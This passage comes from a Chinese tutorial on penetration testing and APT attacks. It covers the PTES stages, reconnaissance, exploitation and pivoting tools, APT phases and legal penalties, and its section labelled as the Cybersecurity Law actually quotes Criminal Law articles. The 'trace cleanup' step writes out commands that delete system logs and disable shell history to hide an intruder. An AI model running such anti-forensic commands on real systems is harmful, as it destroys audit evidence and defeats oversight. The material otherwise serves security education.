系统 / 应用三者组合使用下的安全状况</td><td>PTES</td></tr><tr><td>风险评估</td><td>以 PDCA 循环持续推进风险管理为目的</td><td>ISO27001</td></tr><tr><td>等保测评</td><td>是否符合等级保护要求为目的</td><td>GA 388-2002</td></tr></tbody></table><h3 id="渗透测试类型"><a class="markdownIt-Anchor" href="#渗透测试类型">#</a> 渗透测试类型</h3><ul><li><p>** 黑盒测试：** 又称为功能测试，渗透者完全处于对系统一无所知的状态，通常这类型测试，最初的信息获取来自于 DNS、Web、Email 及各种公开对外的服务器。</p></li><li><p><strong>白盒测试</strong>：也称为结构测试，与黑箱测试恰恰相反，测试者可以通过正常渠道向被测单位取得各种资料，包括网络拓扑、员工资料甚至网站或其它程序的代码片段，也能够与单位的其它员工进行面对面的沟通。这类测试的目的是模拟企业内部雇员的越权操作。</p></li><li><p><strong>灰盒测试</strong>：是介于白盒测试与黑盒测试之间的一种测试，通常情况下，接受渗透测试的单位网络管理部门会收到通知：在某些时段进行测试。因此能够监测网络中出现的变化。但灰盒测试被测单位也仅有极少数人知晓测试的存在，因此能够有效地检验单位中的信息安全事件监控、响应、恢复做得是否到位。</p></li></ul><h3 id="渗透测试的分类"><a class="markdownIt-Anchor" href="#渗透测试的分类">#</a> 渗透测试的分类</h3><p>根据渗透测试目标：</p><ul><li><ul><li>主机操作系统渗透测试；</li><li>数据库系统渗透测试；</li></ul></li><li><ul><li>应用系统渗透测试；</li></ul></li><li><ul><li><ul><li>对渗透目标提供的各种应用，如 ASP，PHP 等组成的 WWW 应用进行渗透测试；</li></ul></li></ul></li><li><ul><li>网络设备渗透测试：对各种防火墙，入侵检测系统，网络设备进行渗透测试；</li><li>内网渗透测试：模拟客户内部违规操作者的行为 (绕过了防火墙的保护)</li></ul></li><li><ul><li>外网渗透测试：模拟对内部状态一无所知的外部攻击者的行为，包括对网络设备的远程攻击，口令管理安全性测试，防火墙规则试探，规避，web 及其他开放应用服务的安全性测试；</li></ul></li></ul><h3 id="渗透测试流程"><a class="markdownIt-Anchor" href="#渗透测试流程">#</a> 渗透测试流程</h3><p>要对一个目标进行渗透测试，首先必须确保安全测试遵循了渗透测试执行标准（Penetration Testing Execution Standard, PTES）如果对渗透测试流程不了解可以在以下网站中学习渗透测试和安全分析的部分内容。</p><h4 id="ptes渗透测试执行标准"><a class="markdownIt-Anchor" href="#ptes渗透测试执行标准">#</a> PTES 渗透测试执行标准</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625734388765-039705ae-e573-4cbc-8319-5168ad1211f8.png" alt="img"></p><p>1.<strong> 前期交互阶段</strong>：在前期交互（Pre-Engagement Interaction）阶段，渗透测试团队与客户组织进行交互讨论，最重要的是确定渗透测试的范围、目标、限制条件以及服务合同细节。</p><p>2.<strong> 情报搜集阶段</strong>：在目标范围确定之后，将进入情报搜集（Information Gathering）阶段，渗透测试团队可以利用各种信息来源与搜集技术方法，尝试获取更多关于目标组织网络拓扑、系统配置与安全防御措施的信息。</p><p>3.<strong> 威胁建模阶段</strong>：在搜集到充分的情报信息之后，渗透测试团队的成员们停下敲击键盘，大家聚到一起针对获取的信息进行威胁建模（Threat Modeling）与攻击规划。这是渗透测试过程中非常重要，但很容易被忽视的一个关键点。</p><p>4.<strong> 漏洞分析阶段</strong> ：在确定出最可行的攻击通道之后，接下来需要考虑该如何取得目标系统的访问控制权，即漏洞分析（Vulnerability Analysis）</p><p>5.<strong> 渗透攻击阶段</strong> ：渗透攻击（Exploitation）是渗透测试过程中最具有魅力的环节。在此环节中，渗透测试团队需要利用他们所找出的目标系统安全漏洞，来真正入侵系统当中，获得访问控制权。</p><p>6.<strong> 后渗透攻击阶段</strong> ：后渗透攻击（Post Exploitation）是整个渗透测试过程中最能够体现渗透测试团队创造力与技术能力的环节。前面的环节可以说都是在按部就班地完成非常普遍的目标，而在这个环节中，需要渗透测试团队根据目标组织的业务经营模式、保护资产形式与安全防御计划的不同特点，自主设计出攻击目标，识别关键基础设施，并寻找客户组织最具价值和尝试安全保护的信息和资产，最终达成能够对客户组织造成最重要业务影响的攻击途径。</p><p>7.<strong> 撰写报告阶段</strong>：渗透测试过程最终向客户组织提交，取得认可并成功获得合同付款的就是一份渗透测试报告（Reporting）。这份报告凝聚了之前所有阶段之中渗透测试团队所获取的关键情报信息、探测和发掘出的系统安全漏洞、成功渗透攻击的过程，以及造成业务影响后果的攻击途径，同时还要站在防御者的角度上，帮助他们分析安全防御体系中的薄弱环节、存在的问题，以及修补与升级技术方案。</p><h4 id="国外渗透测试执行标准"><a class="markdownIt-Anchor" href="#国外渗透测试执行标准">#</a> <span class="exturl" data-url="aHR0cDovL3d3dy5wZW50ZXN0LXN0YW5kYXJkLm9yZy9pbmRleC5waHAvTWFpbl9QYWdl">国外渗透测试执行标准</span></h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1622517200381-4d269443-1467-462b-88a0-0f9bfae04780.png" alt="img"></p><p><strong>1：确定目标</strong></p><table><thead><tr><th>渗透目标</th><th>常见应用</th></tr></thead><tbody><tr><td>操作系统</td><td>Linux 主机 / Windows 主机</td></tr><tr><td>数据库系统</td><td>SQL Server/MySQL/Oracle/DB2/PostgreSQL/….</td></tr><tr><td>应用系统</td><td>FTP/DNS/DHCP/WEB/RDP/….</td></tr><tr><td>网络设备</td><td>防火墙 / 入侵检测系统 / 交换机 / 路由器</td></tr></tbody></table><ul><li>风险规避</li></ul><p>明确渗透测试范围；</p><p>测试之前对重要数据进行备份；</p><p>不要进行 DDos/CC 攻击，不破坏数据；</p><p>可以对原始系统生成镜像环境，然后对镜像环境进行测试；</p><p>任何测试执行前必须和客户进行沟通，以免引来不必要的麻烦；</p><p><strong>2：信息收集</strong></p><table><thead><tr><th>收集信息</th><th>应用场景</th></tr></thead><tbody><tr><td>真实 IP 地址</td><td>确定网站的真实 IP 地址，才能挖掘出更多有用的信息</td></tr><tr><td>子域名信息</td><td>如果发现不了网站的管理界面，不妨提前收集好子域名信息</td></tr><tr><td>whois 信息</td><td>确定网站是否合法？要爆破管理用户登录？鱼叉式网络钓鱼攻击？</td></tr><tr><td>指纹信息</td><td>操作系统 / 数据库 / CMS 管理系统？</td></tr><tr><td>网站敏感文件</td><td>Robots 文件 / 文件上传页面 / 网站备份文件 / 管理员登录……</td></tr><tr><td>端口开放信息</td><td>21/22/25/80/443/1433/1521/3306/3389/5000/5432/</td></tr><tr><td>旁站 / C 段扫描</td><td>一台服务器多台网站？同一网段服务器？</td></tr></tbody></table><ul><li>思考：信息收集对渗透测试的重要程度？</li></ul><p><strong>3：漏洞探测</strong></p><table><thead><tr><th>漏洞名称</th><th>目标获取</th></tr></thead><tbody><tr><td>SQL Injection</td><td>数据库信息…</td></tr><tr><td>Cross site scripting</td><td>Cookie 信息…</td></tr><tr><td>Cross site request forgery</td><td>Cookie 信息…</td></tr><tr><td>File Include</td><td>脚本木马…</td></tr><tr><td>File Upload</td><td>后门上传…</td></tr><tr><td>Command execution</td><td>系统命令执行…</td></tr><tr><td>Code execution</td><td>脚本代码执行…</td></tr><tr><td>Code Injection</td><td>获取内网信息…</td></tr><tr><td>brute force</td><td>猜解用户密码…</td></tr><tr><td>Struts2</td><td>获取用户权限…</td></tr></tbody></table><p><strong>4：漏洞利用</strong></p><p>当我们探测到了该网站存在漏洞之后，我们就要对该漏洞进行利用了。不同的漏洞有不同的利用工具，很多时候，通过一个漏洞我们很难拿到网站的 webshell，我们往往需要结合几个漏洞来拿 webshell。常用的漏洞利用工具如下：</p><table><thead><tr><th>常见漏洞</th><th>漏洞利用工具</th></tr></thead><tbody><tr><td>SQL 注入</td><td>SQLMap ……</td></tr><tr><td>XSS 跨站</td><td>XSS-Beef ……</td></tr><tr><td>抓包改包</td><td>BurpSuite，Fiddler，Wireshark，Winsock……</td></tr><tr><td>加密解密</td><td>Hackbar ……</td></tr><tr><td>暴力破解</td><td>Hydra Medusa……</td></tr></tbody></table><p><strong>5：权限提升</strong></p><p>至此已经拿到了 webshell 也就是获取网站的管理权限，这一步就已经开始了后渗透测试的篇章</p><p>顾名思义，权限提升在这里是指将我们的普通用户权限提升到 Administrator 或者 Root 权限，常见的提权工具如下：</p><ol><li>Windows 提权   iis-administrator</li></ol><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1NlY1dpa2kvd2luZG93cy1rZXJuZWwtZXhwbG9pdHM=">https://github.com/SecWiki/windows-kernel-exploits</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x5c2hhcmsvV2luZG93cy1leHBsb2l0cw==">https://github.com/lyshark/Windows-exploits</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2tsc2ZjdC9nZXRzaGVsbA==">https://github.com/klsfct/getshell</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lhbnh0aWFueHQvd2luLWV4cC0=">https://github.com/ianxtianxt/win-exp-</span></p><ol><li>Linux 提权   www-data----root</li></ol><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1NlY1dpa2kvbGludXgta2VybmVsLWV4cGxvaXRz">https://github.com/SecWiki/linux-kernel-exploits</span></p><p><strong>6：内网渗透</strong></p><p>如果我们还想进一步的探测内网主机的信息的话，我们就需要进行内网转发了。我们是不能直接和内网的主机通信的，所以我们就需要借助获取到的 webshell 网站的服务器和内网主机进行通信。</p><table><thead><tr><th>转发方式</th><th>转发工具</th></tr></thead><tbody><tr><td>端口转发</td><td>LCX/PortMap/Nc</td></tr><tr><td>流量代理</td><td>EW/Frp/reGeorg/sSocks/proxychains/</td></tr></tbody></table><ul><li>内网渗透<br> —&gt; 域环境<br> —&gt; 非域环境</li></ul><p><strong>7：痕迹清理</strong></p><p>完全清理入侵痕迹？主要是增加管理员发现入侵者的时间成本和人力成本。只要管理员想查，无论怎么清除，还是能查到的。其主要目的还是要以隐藏入侵者身份为主，最好的手段是在渗透前挂上代理，然后在渗透后痕迹清除。</p><ul><li>Windows 系统</li></ul><p>系统日志文件:del % WINDR% .log/a/s/q/f</p><p>web 日志文件：access.log error.log</p><ul><li>Linux 系统</li></ul><p>历史命令 export HISTFILE=/dev/null export HISTSIZE=0</p><p>系统日志文件：rm -rf /var/log/*.log</p><p>web 日志文件:.access_log error_log</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1622517199147-6274226d-7f19-4c2c-9737-94fba8c5ef16.png" alt="img"></p><ul><li>思考：怎样将入侵痕迹完全清除？</li></ul><p><strong>8：撰写报告</strong></p><p>在完成了渗透测试之后，我们就需要对这次渗透测试撰写渗透测试报告了。一个好的渗透测试报告至关重要，首先你需要明确漏洞名称以及漏洞原理。其次要注明参与人员，测试时间，内网外网在报告中具体阐述漏洞是如何产生的，如何利用的。最后应该给出详细的解决方案。</p><table><thead><tr><th>包含内容</th><th>解析</th></tr></thead><tbody><tr><td>封面</td><td>测试公司的名称、标志以及客户的名称应该突出显示。</td></tr><tr><td>内容提要</td><td>像短篇小说一样的内容提要，内容要限制在一页纸以内</td></tr><tr><td>漏洞总结</td><td>可以使用花哨的图形（表格或图表），清晰明了漏洞列表</td></tr><tr><td>团队信息</td><td>渗透测试人员名字 / 联系方式</td></tr><tr><td>工具列表</td><td>渗透测试工具要包括版本和功能的简要描述</td></tr><tr><td>工作范围</td><td>应事先已经同意，可测试的目标范围</td></tr><tr><td>报告主体</td><td>主体：如何发现和利用以及修补漏洞，细节信息</td></tr></tbody></table><h2 id="三apt"><a class="markdownIt-Anchor" href="#三apt">#</a> 三：APT</h2><h3 id="简介"><a class="markdownIt-Anchor" href="#简介">#</a> 简介</h3><p>APT (Advanced Persistent Threat)，翻译为高级持续威胁。2006 年，APT 攻击的概念被正式提出，用来描述从 20 世纪 90 年代末到 21 世纪初在美国军事和政府网络中发现的隐蔽且持续的网络攻击。</p><p>APT 攻击多用于指利用互联网进行网络间谍活动，其目标大多是获取高价值的敏感情报或者控制目标系统，对目标系统有着非常严重的威胁。</p><p>发起 APT 攻击的通常是一个组织，其团体是一个既有能力也有意向持续而有效地进行攻击的实体。个人或者小团体发起的攻击一般不会被称为 APT，因为即使其团体有意图攻击特定目标，也很少拥有先进和持久的资源来完成相应的攻击行为。</p><p>APT 的攻击手段通常包括供应链攻击、社会工程学攻击、零日攻击和僵尸网络等多种方式。其基于这些攻击手段将将自定义的恶意代码放置在一台或多台计算机上执行特定的任务，并保持在较长的时间内不被发现。</p><p>和传统的大面积扫描的攻击方式不同，因为 APT 攻击通常只面向单一特定的目标，且多数攻击会综合一系列手段来完成一次 APT 攻击，使其有着非常高的隐蔽性和复杂性，让对 APT 攻击的检测变得相当困难。</p><p>比较著名的 APT 组织：</p><ul><li><ul><li><strong>APT-32 / 海莲花 (<strong><strong>APT-C-00</strong></strong>)</strong></li><li><strong>毒云藤（APT-C-01）</strong></li></ul></li><li><ul><li><strong>TA505</strong></li><li><strong>蓝宝菇 (APT-C-12)</strong></li></ul></li><li><ul><li><strong>摩诃草</strong> **(APT-C-09)**</li><li>** 蔓灵花 (**<strong>APT-C-08）</strong></li></ul></li><li><ul><li><strong>DarkHotel(APT-C-06)</strong></li><li><strong>APT28(APT-C-20)</strong></li></ul></li><li><ul><li><strong>Lazarus(APT-C-26)</strong></li><li><strong>洋葱狗 (APT-C-03)</strong></li></ul></li><li><ul><li><strong>美人鱼 (APT-C-07)</strong></li></ul></li><li><ul><li>**APT 组织汇总：**<span class="exturl" data-url="aHR0cHM6Ly9hdHRhY2subWl0cmUub3JnL2dyb3Vwcy8=">https://attack.mitre.org/groups/</span></li></ul></li></ul><h3 id="三大方面"><a class="markdownIt-Anchor" href="#三大方面">#</a> 三大方面</h3><h4 id="高级性advanced"><a class="markdownIt-Anchor" href="#高级性advanced">#</a> 高级性（Advanced）</h4><p>APT 攻击会结合当前所有可用的攻击手段和技术，使得攻击具有极高的隐蔽性和渗透性。</p><p>网络钓鱼就是其中的一种攻击方式。攻击者通常会结合社会工程学等手段来伪造可信度非常高的电子邮件，冒充目标信任的公司或者组织来发送难以分辨真假的对目标诱惑度很高恶意电子邮件。通过这些邮件来诱使被受害者访问攻击者控制的网站或者下载恶意代码。</p><p>APT 攻击通常还会采用其他的方式来伪装自己的攻击行为，从而实现规避安全系统检测的目的。比如有的恶意代码会通过伪造合法签名来逃避杀毒软件检测。以震网病毒为例，其在攻击时就使用了白加黑的模式，利用合法的证书对其代码进行了签名，这种攻击方式会使得大部分恶意代码查杀引擎会直接认为恶意代码是合法的，而不进行任何的检测。</p><p>除了利用合法签名绕过检测，APT 攻击者在攻击过程中也经常利用第三方的站点作为媒介来攻击目标，而不是使用传统的点到点攻击模式。这种模式通常被称为水坑攻击。</p><p>水坑攻击是一种入侵的手法，一般来说，是在攻击者对目标有一定了解后，确定攻击目标经常访问的网站，而后入侵其中的一个或几个网站，并对这些网站植入恶意代码，最后来实现借助该网站感染目标的能力。因为这种攻击借助了目标信任的第三方网站，攻击的成功率相对钓鱼攻击来说要高出很多。</p><p>另外一个能体现 APT 攻击高级性的特征是零日漏洞，目前国际上黑市一个零日漏洞的价格在数十万到数百万不等，每一个零日漏洞的稳定利用都需要大量的资源投入。而在 APT 攻击中，零日漏洞的利用非常广泛。以 APT28 为例，据统计，仅 2015 年一年当中<span class="exturl" data-url="aHR0cHM6Ly9hdHRhY2subWl0cmUub3JnL2dyb3Vwcy9HMDAwNy8="> APT28</span> 在攻击中就至少使用了六个零日漏洞。</p><h4 id="持续性persistent"><a class="markdownIt-Anchor" href="#持续性persistent">#</a> 持续性（Persistent）</h4><p>和传统的基于短期利益的网络攻击有很大的不同。APT 攻击的过程通常包括多个实施阶段。攻击者很很多情况下都是使用逐层渗透的方式来突破高级的防御系统，整个攻击过程一般持续时间会达到几个月甚至数年。</p><p>一般来说，APT 攻击可以分为以下几个阶段。</p><p><strong>侦查阶段</strong></p><p>为了能够找到目标的脆弱点，攻击者通常会做大量的准备工作。在这个阶段攻击者多会使用基于大数据分析的隐私收集或者基于社会工程学的攻击来收集目标的信息，为了之后的攻击做出充分的准备。</p><p><strong>初次入侵阶段</strong></p><p>基于初次侦查的信息，攻击者通常能收集到目标所使用的软件、操作系统系统版本等信息。在获取这些信息后，攻击者可以挖掘软件对应版本的零日漏洞或者使用已知漏洞来对系统做出初期的入侵行为，获取对目标一定的控制权限。</p><p><strong>权限提升阶段</strong></p><p>在复杂网络中，攻击者初次入侵所获得的权限通常是较低的权限，而为了进一步的攻击，攻击者需要获取更高的权限来完成其需要的攻击行为。在这个阶段，攻击者通常会使用权限提升漏洞或者爆破密码等行为来实现权限提升的目的，最后获得系统甚至域的管理员权限。</p><p><strong>保持访问阶段</strong></p><p>在成功入侵目标计算机并且有一定的权限之后，攻击者一般会使用各种方式来保持对系统的访问权限。其中一个比较常用的方式是窃取合法用户的登录凭证。当获取了用户的访问凭证之后，可以使用远程控制工具（RAT，Remote Access Tools）来建立连接，并在连接建立之后，植入特定的后门来达到持续控制的效果。</p><p><strong>横向扩展阶段</strong></p><p>当攻击者掌握一定的目标之后，会以较慢且较隐蔽的方式逐渐在内网扩散。主要方式是先在内网进行一定的侦查。基于这些侦查，获得内网计算机的相关信息，并结合这些信息使用软件漏洞或者弱密码爆破等手段来进行横向的进一步渗透，获取更多的权限和信息。</p><p><strong>攻击收益阶段</strong></p><p>APT 攻击的主要目的是窃取目标系统的信息或对其造成一定的破坏。在完成横向扩展控制一定的内网机器后。以收集信息为目标的攻击者会使用加密通道的方式把获取的信息逐渐回传并消除入侵痕迹。而以造成破坏为目标的攻击，则在这个阶段进行相应的攻破坏。</p><h4 id="威胁性threat"><a class="markdownIt-Anchor" href="#威胁性threat">#</a> 威胁性（Threat）</h4><p>和传统攻击不同，APT 攻击的攻击手段和方案大都是针对特定的攻击对象和目的来设计。相对其他攻击，攻击者有着非常明确的目标和目的，很少会使用自动化的攻击方式，而是精确的攻击。</p><p>另外 APT 的目标多是政府机构、金融、能源等敏感企业、部门，一旦这些目标被成功攻击，其影响往往十分巨大。据目前已知的信息，在美国、俄罗斯等国的大选中，以及欧洲一些政治事件中，都有 APT 攻击出现。APT 攻击已经成为国家之间斗争的一种重要手段。</p><h3 id="相关事件"><a class="markdownIt-Anchor" href="#相关事件">#</a> 相关事件</h3><ul><li><p>2010 年伊朗震网病毒</p></li><li><ul><li><span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTklOUMlODclRTclQkQlOTElRTclOTclODUlRTYlQUYlOTIvMzU1OTYwMQ==">https://baike.baidu.com/item/%E9%9C%87%E7%BD%91%E7%97%85%E6%AF%92/3559601</span></li></ul></li><li><p>2013 美国棱镜门事件：</p></li><li><ul><li><span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlQTMlQjElRTklOTUlOUMlRTklOTclQTgvNjAwNjMzMw==">https://baike.baidu.com/item/%E6%A3%B1%E9%95%9C%E9%97%A8/6006333</span></li></ul></li><li><p>Google 极光攻击：</p></li><li><ul><li><span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU2JTlFJTgxJUU1JTg1JTg5JUU4JUExJThDJUU1JThBJUE4">https://zh.wikipedia.org/wiki/%E6%9E%81%E5%85%89%E8%A1%8C%E5%8A%A8</span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lvdWthd2EvYXJ0aWNsZS9kZXRhaWxzLzQyMDQxODE1">https://blog.csdn.net/youkawa/article/details/42041815</span></li></ul></li><li><p>夜龙攻击：</p></li><li><ul><li><span class="exturl" data-url="aHR0cDovL2Jsb2cuc2NpZW5jZW5ldC5jbi9ibG9nLTk0NzEwMS03NTc0OTcuaHRtbA==">http://blog.sciencenet.cn/blog-947101-757497.html</span></li></ul></li><li><p>暗鼠行动：</p></li><li><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cudGVjaGJhbmcuY29tL3Bvc3RzLzY2MTYtdGhlLWhpc3Rvcnktb2YtdGhlLWxhcmdlc3QtdGVycm9yaXN0LWF0dGFja3MtaGFja2Vycy1vcGVyYXRpb24tc2hhZHktcmF0LXRhaXdhbi12aWN0aW1z">https://www.techbang.com/posts/6616-the-history-of-the-largest-terrorist-attacks-hackers-operation-shady-rat-taiwan-victims</span></li></ul></li><li><p>…</p></li></ul><h3 id="apt入侵途径"><a class="markdownIt-Anchor" href="#apt入侵途径">#</a> APT 入侵途径</h3><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627209900551-8157ae17-f7da-40b3-bdd5-9a0b92a0c96f.png" alt="img"></p><p>鱼叉攻击 (Spear phishing)：</p><ul><li><ul><li>针对特定组织的网络欺诈行为，目的不是通过授权便可以访问机密事件，最常见的方法是将木马程序作为电子邮件的附件发送给特定的攻击目标，并诱使目标触发邮件；</li></ul></li></ul><p>水坑攻击 (Watering hole)：</p><ul><li><ul><li>黑客通过分析攻击目标的网络活动规律寻找攻击目标常访问的网站的弱点，先攻击该网站并植入攻击代码，然后等待攻击目标访问该网站并实施攻击；</li></ul></li></ul><h4 id="网络攻击链也称杀伤链cyber-kill-chain"><a class="markdownIt-Anchor" href="#网络攻击链也称杀伤链cyber-kill-chain">#</a> 网络攻击链（也称杀伤链，Cyber Kill Chain）</h4><p>洛克希德 - 马丁公司提出的描述针对性的分阶段攻击；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/jpeg/2336202/1627210463380-6a32cbf0-43d7-44a3-8230-134afcd31b1e.jpeg" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627211559525-e6edb0e3-d6c8-48eb-9192-6015ad9e1338.png" alt="img"></p><h3 id="apt防护思路"><a class="markdownIt-Anchor" href="#apt防护思路">#</a> APT 防护思路</h3><p>FireEye：</p><ul><li><ul><li>采用高级检测技术和关联数据分析来发现 APT 行为；</li></ul></li></ul><p>赛门铁克：</p><ul><li><ul><li>采用数据加密和数据防泄密 (DLP) 来防止敏感数据外泄；</li></ul></li></ul><p>RSA：</p><ul><li><ul><li>采用身份认证和用户权限管理技术，严格管控内网对核心数据和业务的访问；</li></ul></li></ul><h3 id="渗透测试与apt的区别"><a class="markdownIt-Anchor" href="#渗透测试与apt的区别">#</a> 渗透测试与 APT 的区别</h3><p>目的上：</p><ul><li><ul><li>渗透测试：是评估计算机网络系统的安全性；</li><li>APT：对高价值目标进行的有组织，长期持续性的控制；</li></ul></li></ul><p>手段上：</p><ul><li><ul><li>渗透测试：渗透测试选择的是通过允许的授权的情况下模拟黑客对目标系统进行测试；</li><li>APT：在未知的情况下，针对于目标的长期的，隐蔽的，针对性的攻击；</li></ul></li></ul><p>结果上：</p><ul><li><ul><li>渗透测试：提高了目标系统的安全级别；</li><li>APT：达成目的的过程中一般会给目标系统带来严重损失；</li></ul></li></ul><h2 id="四技术及行业发展"><a class="markdownIt-Anchor" href="#四技术及行业发展">#</a> 四：技术及行业发展</h2><p><em><strong>有需求才有业务</strong></em></p><h3 id="黑客技术发展趋势"><a class="markdownIt-Anchor" href="#黑客技术发展趋势">#</a> 黑客技术发展趋势</h3><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1622517200626-18b928de-f15d-4e38-80ac-df158d7a31c2.png" alt="img"></p><ul><li>2019 年 10 大黑客技术：<span class="exturl" data-url="aHR0cHM6Ly9ub3NlYy5vcmcvaG9tZS9kZXRhaWwvNDEyNi5odG1s">https://nosec.org/home/detail/4126.html</span></li></ul><h3 id="技术层面的黑客等级"><a class="markdownIt-Anchor" href="#技术层面的黑客等级">#</a> 技术层面的黑客等级</h3><table><thead><tr><th>等级划分</th><th>各级现状</th></tr></thead><tbody><tr><td>Level 1</td><td>愣头青【百万人】: 会使用安全工具，只能简单扫描、破译密码</td></tr><tr><td>Level 2</td><td>系统管理员【上万人】: 善用安全工具，特别熟悉系统及网络</td></tr><tr><td>Level 3</td><td>大公司开发人员或核心安全公司大牛【几千人】: 对操作系统特别熟悉，开发代码</td></tr><tr><td>Level 4</td><td>挖掘并利用漏洞【几百人】: 自己能找漏洞并写 exp 利用漏洞的；对系统挖洞的协议测试</td></tr><tr><td>Level 5</td><td>高水平【少于百人】：防御和构建系统的人</td></tr><tr><td>Level 6</td><td>精英级【几十人到十几人】：对操作系统的理解很深入</td></tr><tr><td>Level 7</td><td>大牛牛【寥寥无几】：马克・扎克伯格、艾伯特・爱因斯坦等改变世界的人</td></tr></tbody></table><h3 id="我认为的黑客等级"><a class="markdownIt-Anchor" href="#我认为的黑客等级">#</a> 我认为的黑客等级</h3><table><thead><tr><th>月收益</th><th>项目</th></tr></thead><tbody><tr><td>80W–</td><td>DDOS 攻击？</td></tr><tr><td>40W-80W</td><td>勒索病毒？挖矿木马？</td></tr><tr><td>20W-40W</td><td>0day 挖掘？外挂制作？</td></tr><tr><td>10W-20W</td><td>SRC / 博彩 / 资金盘 / 股票盘 /… 非法站</td></tr></tbody></table><ul><li>友情提示：赚钱的项目都写到刑法里了，切勿知法犯法</li></ul><h3 id="薪资水平"><a class="markdownIt-Anchor" href="#薪资水平">#</a> 薪资水平</h3><ul><li><span class="exturl" data-url="aHR0cDovL3d3dy5nc3FpLm5ldC9nb25nemkvMjY2MjIv">网路安全 / 月薪收入</span></li></ul><h3 id="行业发展"><a class="markdownIt-Anchor" href="#行业发展">#</a> 行业发展</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly9tcC5vZndlZWsuY29tL3NlY3VyaXR5L2EwNTY3MTQyNjMwNzc=">2020 年中国网络安全行业市场规模及发展前景分析</span></li></ul><h2 id="五网络安全法"><a class="markdownIt-Anchor" href="#五网络安全法">#</a> 五:《网络安全法》</h2><p>“没有规矩，不成方圆”</p><p>2016 年 11 月 7 日第二十届全国人民代表大会常务委员会第二十四次通过《中华人民共和国网络安全法》，自 2017 年 6 月 1 日施行；</p><p><em><strong>六方面亮点</strong></em></p><ol><li><p>明确了网络空间主权的原则。</p></li><li><p>明确了网络产品和服务提供者的安全义务。</p></li><li><p>明确了网络运营者的安全义务。</p></li><li><p>进一步完善了个人信息保护规则。</p></li><li><p>建立了关键信息基础设施安全保护制度。</p></li><li><p>确立了关键信息机出设施重要数据跨境传输的规则。</p></li></ol><h3 id="网络安全法内容"><a class="markdownIt-Anchor" href="#网络安全法内容">#</a> 《网络安全法》内容</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">第二百八十二条    </span><br><span class="line">    以窃取、刺探、收买方法，非法获取国家秘密的，处三年以下有期徒刑、拘役、管制或者剥夺政治权利；情节严重的，处三年以上七年以下有期徒刑。</span><br><span class="line">    非法持有属于国家绝密、机密的文件、资料或者其他物品，拒不说明来源与用途的，处三年以下有期徒刑、拘役或者管制。</span><br><span class="line"></span><br><span class="line">第二百八十三条    </span><br><span class="line">    非法生产、销售窃听、窃照等专用间谍器材的，处三年以下有期徒刑、拘役或者管制。</span><br><span class="line">    </span><br><span class="line">第二百八十四条    </span><br><span class="line">    非法使用窃听、窃照专用器材，造成严重后果的，处二年以下有期徒刑、拘役或者管制。</span><br><span class="line"></span><br><span class="line">第二百八十五条    </span><br><span class="line">    违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。</span><br><span class="line">        </span><br><span class="line">第二百八十六条    </span><br><span class="line">    违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役；后果特别严重的，处五年以上有期徒刑。</span><br><span class="line">    违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。</span><br><span class="line">    故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。</span><br><span class="line"></span><br><span class="line">第二百八十七条    </span><br><span class="line">    利用计算机实施金融诈骗、盗窃、贪污、挪用公款、窃取国家秘密或者其他犯罪的，依照本法有关规定定罪处罚。</span><br><span class="line"></span><br><span class="line">第二百八十八条    </span><br><span class="line">    违反国家规定，擅自设置、使用无线电台（站），或者擅自占用频率，经责令停止使用后拒不停止使用，干扰无线电通讯正常进行，造成严重后果的，处三年以下有期徒刑、拘役或者管制，并处或者单处罚金。</span><br><span class="line">    单位犯前款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照前款的规定处罚。</span><br></pre></td></tr></table></figure><ul><li>《网络安全法》百度云盘分享：链接：<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMTEwYjloWXdJb3lDMEFIX0dYa3NEN2c=">https://pan.baidu.com/s/110b9hYwIoyC0AH_GXksD7g</span> 提取码：laos</li></ul><h3 id="判刑案例"><a class="markdownIt-Anchor" href="#判刑案例">#</a> 判刑案例：</h3><h4 id="苏州紫豹科技有限公司网络尖刀安全团队ceo吴永丰被判12年"><a class="markdownIt-Anchor" href="#苏州紫豹科技有限公司网络尖刀安全团队ceo吴永丰被判12年">#</a> 苏州紫豹科技有限公司 / 网络尖刀安全团队 CEO 吴永丰被判 12 